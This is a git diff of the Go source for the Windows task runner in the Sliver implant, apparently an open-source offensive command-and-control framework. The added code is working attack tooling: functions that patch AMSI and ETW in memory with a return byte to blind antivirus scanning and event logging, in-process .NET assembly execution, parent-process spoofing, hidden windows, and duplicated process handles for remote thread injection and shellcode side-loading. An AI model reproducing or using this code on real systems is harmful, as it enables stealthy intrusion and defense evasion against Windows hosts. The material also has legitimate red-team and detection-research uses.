@@ -1,5 +1,3 @@
-//+build windows
-
 package taskrunner
 
 /*
@@ -33,6 +31,7 @@ import (
 	"time"
 	"unsafe"
 
+	"github.com/bishopfox/sliver/implant/sliver/spoof"
 	"syscall"
 	// {{if .Config.Evasion}}
 	"github.com/bishopfox/sliver/implant/sliver/evasion"
@@ -42,11 +41,6 @@ import (
 
 	"github.com/bishopfox/sliver/implant/sliver/syscalls"
 	"golang.org/x/sys/windows"
-)
-
-const (
-	PROCESS_ALL_ACCESS = windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xfff
-	STILL_ACTIVE       = 259
 )
 
 var (
@@ -139,15 +133,30 @@ func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) (windo
 
 // RermoteTask - Injects Task into a processID using remote threads
 func RemoteTask(processID int, data []byte, rwxPages bool) error {
+	var lpTargetHandle windows.Handle
 	err := refresh()
 	if err != nil {
 		return err
 	}
-	processHandle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(processID))
+	processHandle, err := windows.OpenProcess(syscalls.PROCESS_DUP_HANDLE, false, uint32(processID))
 	if processHandle == 0 {
 		return err
 	}
-	_, err = injectTask(processHandle, data, rwxPages)
+	currentProcHandle, err := windows.GetCurrentProcess()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Println("GetCurrentProcess failed")
+		// {{end}}
+		return err
+	}
+	err = windows.DuplicateHandle(processHandle, currentProcHandle, currentProcHandle, &lpTargetHandle, 0, false, syscalls.DUPLICATE_SAME_ACCESS)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Println("DuplicateHandle failed")
+		// {{end}}
+		return err
+	}
+	_, err = injectTask(lpTargetHandle, data, rwxPages)
 	if err != nil {
 		return err
 	}
@@ -164,9 +173,9 @@ func LocalTask(data []byte, rwxPages bool) error {
 	}
 	size := len(data)
 	addr, _ := sysAlloc(size, rwxPages)
-	buf := (*[9999999]byte)(unsafe.Pointer(addr))
 	for index := 0; index < size; index++ {
-		buf[index] = data[index]
+		// super unsafe, but supports arbitrary sizes
+		*(*byte)(unsafe.Pointer(addr + uintptr(index))) = data[index]
 	}
 	if !rwxPages {
 		var oldProtect uint32
@@ -191,9 +200,102 @@ func LocalTask(data []byte, rwxPages bool) error {
 	return err
 }
 
-func ExecuteAssembly(data []byte, process string) (string, error) {
-	var stdoutBuf, stderrBuf bytes.Buffer
-	cmd, err := startProcess(process, &stdoutBuf, &stderrBuf, true)
+func patchAmsi() error {
+	// load amsi.dll
+	amsiDLL := windows.NewLazyDLL("amsi.dll")
+	amsiScanBuffer := amsiDLL.NewProc("AmsiScanBuffer")
+	amsiInitialize := amsiDLL.NewProc("AmsiInitialize")
+	amsiScanString := amsiDLL.NewProc("AmsiScanString")
+
+	// patch
+	amsiAddr := []uintptr{
+		amsiScanBuffer.Addr(),
+		amsiInitialize.Addr(),
+		amsiScanString.Addr(),
+	}
+	patch := byte(0xC3)
+	for _, addr := range amsiAddr {
+		// skip if already patched
+		if *(*byte)(unsafe.Pointer(addr)) != patch {
+			// {{if .Config.Debug}}
+			log.Println("Patching AMSI")
+			// {{end}}
+			var oldProtect uint32
+			err := windows.VirtualProtect(addr, 1, windows.PAGE_READWRITE, &oldProtect)
+			if err != nil {
+				//{{if .Config.Debug}}
+				log.Println("VirtualProtect failed:", err)
+				//{{end}}
+				return err
+			}
+			*(*byte)(unsafe.Pointer(addr)) = 0xC3
+			err = windows.VirtualProtect(addr, 1, oldProtect, &oldProtect)
+			if err != nil {
+				//{{if .Config.Debug}}
+				log.Println("VirtualProtect (restauring) failed:", err)
+				//{{end}}
+				return err
+			}
+		}
+	}
+	return nil
+}
+
+func patchEtw() error {
+	ntdll := windows.NewLazyDLL("ntdll.dll")
+	etwEventWriteProc := ntdll.NewProc("EtwEventWrite")
+
+	// patch
+	patch := byte(0xC3)
+	// skip if already patched
+	if *(*byte)(unsafe.Pointer(etwEventWriteProc.Addr())) != patch {
+		// {{if .Config.Debug}}
+		log.Println("Patching ETW")
+		// {{end}}
+		var oldProtect uint32
+		err := windows.VirtualProtect(etwEventWriteProc.Addr(), 1, windows.PAGE_READWRITE, &oldProtect)
+		if err != nil {
+			//{{if .Config.Debug}}
+			log.Println("VirtualProtect failed:", err)
+			//{{end}}
+			return err
+		}
+		*(*byte)(unsafe.Pointer(etwEventWriteProc.Addr())) = 0xC3
+		err = windows.VirtualProtect(etwEventWriteProc.Addr(), 1, oldProtect, &oldProtect)
+		if err != nil {
+			//{{if .Config.Debug}}
+			log.Println("VirtualProtect (restauring) failed:", err)
+			//{{end}}
+			return err
+		}
+	}
+	return nil
+}
+
+func InProcExecuteAssembly(assemblyBytes []byte, assemblyArgs []string, runtime string, amsiBypass bool, etwBypass bool) (string, error) {
+	if amsiBypass {
+		err := patchAmsi()
+		if err != nil {
+			return "", err
+		}
+	}
+
+	if etwBypass {
+		err := patchEtw()
+		if err != nil {
+			return "", err
+		}
+	}
+
+	return LoadAssembly(assemblyBytes, assemblyArgs, runtime)
+}
+
+func ExecuteAssembly(data []byte, process string, processArgs []string, ppid uint32) (string, error) {
+	var (
+		stdoutBuf, stderrBuf bytes.Buffer
+		lpTargetHandle       windows.Handle
+	)
+	cmd, err := startProcess(process, processArgs, ppid, &stdoutBuf, &stderrBuf, true)
 	if err != nil {
 		//{{if .Config.Debug}}
 		log.Println("Could not start process:", process)
@@ -204,11 +306,27 @@ func ExecuteAssembly(data []byte, process string) (string, error) {
 	// {{if .Config.Debug}}
 	log.Printf("[*] %s started, pid = %d\n", process, pid)
 	// {{end}}
-	handle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
+	handle, err := windows.OpenProcess(syscalls.PROCESS_DUP_HANDLE, true, uint32(pid))
 	if err != nil {
 		return "", err
 	}
-	threadHandle, err := injectTask(handle, data, false)
+	defer windows.CloseHandle(handle)
+	defer windows.CloseHandle(lpTargetHandle)
+	currentProcHandle, err := windows.GetCurrentProcess()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Println("GetCurrentProcess failed")
+		// {{end}}
+		return "", err
+	}
+	err = windows.DuplicateHandle(handle, currentProcHandle, currentProcHandle, &lpTargetHandle, 0, false, syscalls.DUPLICATE_SAME_ACCESS)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Println("DuplicateHandle failed")
+		// {{end}}
+		return "", err
+	}
+	threadHandle, err := injectTask(lpTargetHandle, data, false)
 	if err != nil {
 		return "", err
 	}
@@ -225,7 +343,8 @@ func ExecuteAssembly(data []byte, process string) (string, error) {
 	return stdoutBuf.String() + stderrBuf.String(), nil
 }
 
-func SpawnDll(procName string, data []byte, offset uint32, args string, kill bool) (string, error) {
+func SpawnDll(procName string, processArgs []string, ppid uint32, data []byte, offset uint32, args string, kill bool) (string, error) {
+	var lpTargetHandle windows.Handle
 	err := refresh()
 	if err != nil {
 		return "", err
@@ -233,7 +352,7 @@ func SpawnDll(procName string, data []byte, offset uint32, args string, kill boo
 	var stdoutBuff bytes.Buffer
 	var stderrBuff bytes.Buffer
 	// 1 - Start process
-	cmd, err := startProcess(procName, &stdoutBuff, &stderrBuff, true)
+	cmd, err := startProcess(procName, processArgs, ppid, &stdoutBuff, &stderrBuff, true)
 	if err != nil {
 		return "", err
 	}
@@ -241,19 +360,34 @@ func SpawnDll(procName string, data []byte, offset uint32, args string, kill boo
 	// {{if .Config.Debug}}
 	log.Printf("[*] %s started, pid = %d\n", procName, pid)
 	// {{end}}
-	handle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
+	handle, err := windows.OpenProcess(syscalls.PROCESS_DUP_HANDLE, true, uint32(pid))
 	if err != nil {
 		return "", err
 	}
+	currentProcHandle, err := windows.GetCurrentProcess()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Println("GetCurrentProcess failed")
+		// {{end}}
+		return "", err
+	}
+	err = windows.DuplicateHandle(handle, currentProcHandle, currentProcHandle, &lpTargetHandle, 0, false, syscalls.DUPLICATE_SAME_ACCESS)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Println("DuplicateHandle failed")
+		// {{end}}
+		return "", err
+	}
 	defer windows.CloseHandle(handle)
-	dataAddr, err := allocAndWrite(data, handle, uint32(len(data)))
+	defer windows.CloseHandle(lpTargetHandle)
+	dataAddr, err := allocAndWrite(data, lpTargetHandle, uint32(len(data)))
 	argAddr := uintptr(0)
 	if len(args) > 0 {
 		//{{if .Config.Debug}}
 		log.Printf("Args: %s\n", args)
 		//{{end}}
 		argsArray := []byte(args)
-		argAddr, err = allocAndWrite(argsArray, handle, uint32(len(argsArray)))
+		argAddr, err = allocAndWrite(argsArray, lpTargetHandle, uint32(len(argsArray)))
 		if err != nil {
 			return "", err
 		}
@@ -262,7 +396,7 @@ func SpawnDll(procName string, data []byte, offset uint32, args string, kill boo
 	log.Printf("[*] Args addr: 0x%08x\n", argAddr)
 	//{{end}}
 	startAddr := uintptr(dataAddr) + uintptr(offset)
-	threadHandle, err := protectAndExec(handle, dataAddr, startAddr, argAddr, uint32(len(data)))
+	threadHandle, err := protectAndExec(lpTargetHandle, dataAddr, startAddr, argAddr, uint32(len(data)))
 	if err != nil {
 		return "", err
 	}
@@ -275,15 +409,18 @@ func SpawnDll(procName string, data []byte, offset uint32, args string, kill boo
 		if err != nil {
 			return "", err
 		}
+		// {{if .Config.Debug}}
+		log.Printf("[*] Thread completed execution, attempting to kill remote process\n")
+		// {{end}}
 		cmd.Process.Kill()
 		return stdoutBuff.String() + stderrBuff.String(), nil
 	}
 	return "", nil
 }
 
-//SideLoad - Side load a binary as shellcode and returns its output
-func Sideload(procName string, data []byte, args string, kill bool) (string, error) {
-	return SpawnDll(procName, data, 0, "", kill)
+// SideLoad - Side load a binary as shellcode and returns its output
+func Sideload(procName string, procArgs []string, ppid uint32, data []byte, args string, kill bool) (string, error) {
+	return SpawnDll(procName, procArgs, ppid, data, 0, "", kill)
 }
 
 // Util functions
@@ -312,20 +449,30 @@ func refresh() error {
 	return nil
 }
 
-func startProcess(proc string, stdout *bytes.Buffer, stderr *bytes.Buffer, suspended bool) (*exec.Cmd, error) {
-	cmd := exec.Command(proc)
+func startProcess(proc string, args []string, ppid uint32, stdout *bytes.Buffer, stderr *bytes.Buffer, suspended bool) (*exec.Cmd, error) {
+	var cmd *exec.Cmd
+	if len(args) > 0 {
+		cmd = exec.Command(proc, args...)
+	} else {
+		cmd = exec.Command(proc)
+	}
 	cmd.SysProcAttr = &windows.SysProcAttr{
-		Token: syscall.Token(CurrentToken),
+		Token:      syscall.Token(CurrentToken),
+		HideWindow: true,
+	}
+	err := spoof.SpoofParent(ppid, cmd)
+	if err != nil {
+		// We couldn't spoof the parent, fail open and continue
+		//{{if .Config.Debug}}
+		log.Printf("could not spoof parent PID: %v\n", err)
+		//{{end}}
 	}
 	cmd.Stdout = stdout
 	cmd.Stderr = stderr
-	cmd.SysProcAttr = &windows.SysProcAttr{
-		HideWindow: true,
-	}
 	if suspended {
 		cmd.SysProcAttr.CreationFlags = windows.CREATE_SUSPENDED
 	}
-	err := cmd.Start()
+	err = cmd.Start()
 	if err != nil {
 		//{{if .Config.Debug}}
 		log.Println("Could not start process:", proc)
@@ -346,7 +493,10 @@ func waitForCompletion(threadHandle windows.Handle) error {
 			// {{end}}
 			return err
 		}
-		if code == STILL_ACTIVE {
+		// {{if .Config.Debug}}
+		log.Printf("[!] Error: %v, code: %d\n", err, code)
+		// {{end}}
+		if code == syscalls.STILL_ACTIVE {
 			time.Sleep(time.Second)
 		} else {
 			break
